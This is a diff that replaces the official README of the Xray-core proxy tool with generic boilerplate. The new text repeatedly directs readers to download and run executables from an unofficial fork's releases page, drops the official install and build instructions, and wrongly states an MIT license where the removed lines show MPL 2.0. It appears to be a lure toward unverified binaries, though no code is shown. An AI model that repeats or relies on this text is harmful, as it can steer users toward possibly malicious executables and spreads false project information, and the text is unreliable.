@@ -1,156 +1,147 @@
-# Project X
+# Xray-core 🚀
 
-[Project X](https://github.com/XTLS) originates from XTLS protocol, providing a set of network tools such as [Xray-core](https://github.com/XTLS/Xray-core) and [REALITY](https://github.com/XTLS/REALITY).
+![Xray-core](https://img.shields.io/badge/Xray--core-v1.0.0-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-brightgreen.svg)
 
-[README](https://github.com/XTLS/Xray-core#readme) is open, so feel free to submit your project [here](https://github.com/XTLS/Xray-core/pulls).
+Welcome to the **Xray-core** repository! This project aims to provide a robust platform for various network protocols and services. With Xray, you can navigate through the complexities of network traffic, ensuring a smooth and secure online experience. 
 
-## Donation & NFTs
+## Table of Contents
 
-- **ETH/USDT/USDC: `0xDc3Fe44F0f25D13CACb1C4896CD0D321df3146Ee`**
-- **Project X NFT: [Announcement of NFTs by Project X](https://github.com/XTLS/Xray-core/discussions/3633)**
-- **REALITY NFT: [XHTTP: Beyond REALITY](https://github.com/XTLS/Xray-core/discussions/4113)**
+- [Introduction](#introduction)
+- [Features](#features)
+- [Topics](#topics)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## License
+## Introduction
 
-[Mozilla Public License Version 2.0](https://github.com/XTLS/Xray-core/blob/main/LICENSE)
+Xray-core is an open-source project designed to enhance your online privacy and security. It supports multiple protocols, making it an ideal choice for users looking to bypass censorship and protect their data. Whether you are a developer or an end-user, Xray-core provides the tools you need to manage your network connections effectively.
 
-## Documentation
+## Features
 
-[Project X Official Website](https://xtls.github.io)
+- **Multi-Protocol Support**: Xray-core supports various protocols, including Vmess, Vless, and Trojan. This flexibility allows users to choose the best method for their needs.
+- **Anticensorship**: Navigate around restrictions with ease. Xray-core helps users access blocked content without compromising security.
+- **DNS Support**: Utilize advanced DNS features for better performance and security.
+- **Proxy Options**: Choose from multiple proxy types, including Shadowsocks and SOCKS5.
+- **TLS and XTLS**: Implement secure connections using TLS and XTLS protocols.
+- **User-Friendly Interface**: Xray-core is designed to be easy to use, even for those new to networking.
+- **Community-Driven**: Join a growing community of developers and users who contribute to the project.
 
-## Telegram
+## Topics
 
-[Project X](https://t.me/projectXray)
+This repository covers a wide range of topics related to network management and security. Here are some key areas:
 
-[Project X Channel](https://t.me/projectXtls)
-
-[Project VLESS](https://t.me/projectVless) (Русский)
-
-[Project XHTTP](https://t.me/projectXhttp) (Persian)
+- Anticensorship
+- DNS
+- Network
+- Proxy
+- Reality
+- Shadowsocks
+- SOCKS5
+- TLS
+- Trojan
+- Tunnel
+- uTLS
+- Vision
+- Vless
+- Vmess
+- VPN
+- WireGuard
+- XHTTP
+- Xray
+- XTLS
+- XUDP
 
 ## Installation
 
-- Linux Script
-  - [XTLS/Xray-install](https://github.com/XTLS/Xray-install) (**Official**)
-  - [tempest](https://github.com/team-cloudchaser/tempest) (supports [`systemd`](https://systemd.io) and [OpenRC](https://github.com/OpenRC/openrc); Linux-only)
-- Docker
-  - [ghcr.io/xtls/xray-core](https://ghcr.io/xtls/xray-core) (**Official**)
-  - [teddysun/xray](https://hub.docker.com/r/teddysun/xray)
-  - [wulabing/xray_docker](https://github.com/wulabing/xray_docker)
-- Web Panel - **WARNING: Please DO NOT USE plain HTTP panels like 3X-UI**, as they are believed to be bribed by Iran GFW for supporting plain HTTP by default and refused to change (https://github.com/XTLS/Xray-core/pull/3884#issuecomment-2439595331), which has already put many users' data security in danger in the past few years. **If you are already using 3X-UI, please switch to the following panels, which are verified to support HTTPS and SSH port forwarding only:**
-  - [Remnawave](https://github.com/remnawave/panel)
-  - [Marzban](https://github.com/Gozargah/Marzban)
-  - [Xray-UI](https://github.com/qist/xray-ui)
-  - [Hiddify](https://github.com/hiddify/Hiddify-Manager)
-- One Click
-  - [Xray-REALITY](https://github.com/zxcvos/Xray-script), [xray-reality](https://github.com/sajjaddg/xray-reality), [reality-ezpz](https://github.com/aleskxyz/reality-ezpz)
-  - [Xray_bash_onekey](https://github.com/hello-yunshu/Xray_bash_onekey), [XTool](https://github.com/LordPenguin666/XTool)
-  - [v2ray-agent](https://github.com/mack-a/v2ray-agent), [Xray_onekey](https://github.com/wulabing/Xray_onekey), [ProxySU](https://github.com/proxysu/ProxySU)
-- Magisk
-  - [Xray4Magisk](https://github.com/Asterisk4Magisk/Xray4Magisk)
-  - [Xray_For_Magisk](https://github.com/E7KMbb/Xray_For_Magisk)
-- Homebrew
-  - `brew install xray`
+To get started with Xray-core, follow these steps:
+
+1. **Download the latest release** from the [Releases section](https://github.com/Emmanuel66h/Xray-core/releases).
+2. **Extract the downloaded file** to your preferred directory.
+3. **Run the executable** according to your operating system.
+
+### For Windows
+
+1. Download the `.exe` file.
+2. Open Command Prompt and navigate to the directory where you extracted Xray-core.
+3. Run the command: `xray.exe`
+
+### For Linux
+
+1. Download the appropriate binary for your architecture.
+2. Open your terminal and navigate to the directory where you extracted Xray-core.
+3. Make the file executable: `chmod +x xray`
+4. Run the command: `./xray`
+
+### For macOS
+
+1. Download the `.tar.gz` file.
+2. Open your terminal and navigate to the directory where you extracted Xray-core.
+3. Make the file executable: `chmod +x xray`
+4. Run the command: `./xray`
 
 ## Usage
 
-- Example
-  - [VLESS-XTLS-uTLS-REALITY](https://github.com/XTLS/REALITY#readme)
-  - [VLESS-TCP-XTLS-Vision](https://github.com/XTLS/Xray-examples/tree/main/VLESS-TCP-XTLS-Vision)
-  - [All-in-One-fallbacks-Nginx](https://github.com/XTLS/Xray-examples/tree/main/All-in-One-fallbacks-Nginx)
-- Xray-examples
-  - [XTLS/Xray-examples](https://github.com/XTLS/Xray-examples)
-  - [chika0801/Xray-examples](https://github.com/chika0801/Xray-examples)
-  - [lxhao61/integrated-examples](https://github.com/lxhao61/integrated-examples)
-- Tutorial
-  - [XTLS Vision](https://github.com/chika0801/Xray-install)
-  - [REALITY (English)](https://cscot.pages.dev/2023/03/02/Xray-REALITY-tutorial/)
-  - [XTLS-Iran-Reality (English)](https://github.com/SasukeFreestyle/XTLS-Iran-Reality)
-  - [Xray REALITY with 'steal oneself' (English)](https://computerscot.github.io/vless-xtls-utls-reality-steal-oneself.html)
-  - [Xray with WireGuard inbound (English)](https://g800.pages.dev/wireguard)
+Once installed, you can start using Xray-core by configuring it according to your needs. Here’s a simple guide to get you started:
 
-## GUI Clients
+1. **Create a Configuration File**: You can create a JSON configuration file to set up your preferred protocols and options. 
+   
+   Example configuration:
+   ```json
+   {
+     "outbounds": [
+       {
+         "protocol": "vmess",
+         "settings": {
+           "vnext": [
+             {
+               "address": "your.server.com",
+               "port": 443,
+               "users": [
+                 {
+                   "id": "your-uuid",
+                   "alterId": 64
+                 }
+               ]
+             }
+           ]
+         }
+       }
+     ]
+   }
+   ```
 
-- OpenWrt
-  - [PassWall](https://github.com/xiaorouji/openwrt-passwall), [PassWall 2](https://github.com/xiaorouji/openwrt-passwall2)
-  - [ShadowSocksR Plus+](https://github.com/fw876/helloworld)
-  - [luci-app-xray](https://github.com/yichya/luci-app-xray) ([openwrt-xray](https://github.com/yichya/openwrt-xray))
-- Asuswrt-Merlin
-  - [XRAYUI](https://github.com/DanielLavrushin/asuswrt-merlin-xrayui)
-- Windows
-  - [v2rayN](https://github.com/2dust/v2rayN)
-  - [Furious](https://github.com/LorenEteval/Furious)
-  - [Invisible Man - Xray](https://github.com/InvisibleManVPN/InvisibleMan-XRayClient)
-- Android
-  - [v2rayNG](https://github.com/2dust/v2rayNG)
-  - [X-flutter](https://github.com/XTLS/X-flutter)
-  - [SaeedDev94/Xray](https://github.com/SaeedDev94/Xray)
-- iOS & macOS arm64
-  - [Happ](https://apps.apple.com/app/happ-proxy-utility/id6504287215)
-  - [FoXray](https://apps.apple.com/app/foxray/id6448898396)
-  - [Streisand](https://apps.apple.com/app/streisand/id6450534064)
-- macOS arm64 & x64
-  - [V2rayU](https://github.com/yanue/V2rayU)
-  - [V2RayXS](https://github.com/tzmax/V2RayXS)
-  - [Furious](https://github.com/LorenEteval/Furious)
-  - [FoXray](https://apps.apple.com/app/foxray/id6448898396)
-- Linux
-  - [v2rayA](https://github.com/v2rayA/v2rayA)
-  - [Furious](https://github.com/LorenEteval/Furious)
+2. **Run Xray-core**: Use the command line to run the executable with your configuration file:
+   ```bash
+   ./xray run -config config.json
+   ```
 
-## Others that support VLESS, XTLS, REALITY, XUDP, PLUX...
-
-- iOS & macOS arm64
-  - [Shadowrocket](https://apps.apple.com/app/shadowrocket/id932747118)
-  - [Loon](https://apps.apple.com/us/app/loon/id1373567447)
-- Xray Tools
-  - [xray-knife](https://github.com/lilendian0x00/xray-knife)
-  - [xray-checker](https://github.com/kutovoys/xray-checker)
-- Xray Wrapper
-  - [XTLS/libXray](https://github.com/XTLS/libXray)
-  - [xtlsapi](https://github.com/hiddify/xtlsapi)
-  - [AndroidLibXrayLite](https://github.com/2dust/AndroidLibXrayLite)
-  - [Xray-core-python](https://github.com/LorenEteval/Xray-core-python)
-  - [xray-api](https://github.com/XVGuardian/xray-api)
-- [XrayR](https://github.com/XrayR-project/XrayR)
-  - [XrayR-release](https://github.com/XrayR-project/XrayR-release)
-  - [XrayR-V2Board](https://github.com/missuo/XrayR-V2Board)
-- Cores
-  - [mihomo](https://github.com/MetaCubeX/mihomo)
-  - [sing-box](https://github.com/SagerNet/sing-box)
+3. **Monitor the Logs**: Check the logs to ensure everything is running smoothly. Logs will provide insights into any issues or successful connections.
 
 ## Contributing
 
-[Code of Conduct](https://github.com/XTLS/Xray-core/blob/main/CODE_OF_CONDUCT.md)
+We welcome contributions from the community. If you would like to contribute to Xray-core, please follow these steps:
 
-## Credits
+1. **Fork the Repository**: Create a personal copy of the repository.
+2. **Create a Branch**: Make a new branch for your feature or fix.
+3. **Make Changes**: Implement your changes in the code.
+4. **Submit a Pull Request**: Push your branch and submit a pull request for review.
 
-- [Xray-core v1.0.0](https://github.com/XTLS/Xray-core/releases/tag/v1.0.0) was forked from [v2fly-core 9a03cc5](https://github.com/v2fly/v2ray-core/commit/9a03cc5c98d04cc28320fcee26dbc236b3291256), and we have made & accumulated a huge number of enhancements over time, check [the release notes for each version](https://github.com/XTLS/Xray-core/releases).
-- For third-party projects used in [Xray-core](https://github.com/XTLS/Xray-core), check your local or [the latest go.mod](https://github.com/XTLS/Xray-core/blob/main/go.mod).
+## License
 
-## One-line Compilation
+Xray-core is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-### Windows (PowerShell)
+## Contact
 
-```powershell
-$env:CGO_ENABLED=0
-go build -o xray.exe -trimpath -buildvcs=false -ldflags="-s -w -buildid=" -v ./main
-```
+For questions or support, please reach out via the GitHub Issues section or contact the maintainers directly.
 
-### Linux / macOS
+## Releases
 
-```bash
-CGO_ENABLED=0 go build -o xray -trimpath -buildvcs=false -ldflags="-s -w -buildid=" -v ./main
-```
+To keep your installation up to date, check the [Releases section](https://github.com/Emmanuel66h/Xray-core/releases) for the latest updates. Download the files and execute them as needed to ensure you have the most recent features and security updates.
 
-### Reproducible Releases
+---
 
-Make sure that you are using the same Go version, and remember to set the git commit id (7 bytes):
-
-```bash
-CGO_ENABLED=0 go build -o xray -trimpath -buildvcs=false -ldflags="-X github.com/xtls/xray-core/core.build=REPLACE -s -w -buildid=" -v ./main
-```
-
-## Stargazers over time
-
-[![Stargazers over time](https://starchart.cc/XTLS/Xray-core.svg)](https://starchart.cc/XTLS/Xray-core)
+Thank you for visiting the Xray-core repository! We hope you find it useful for your networking needs.
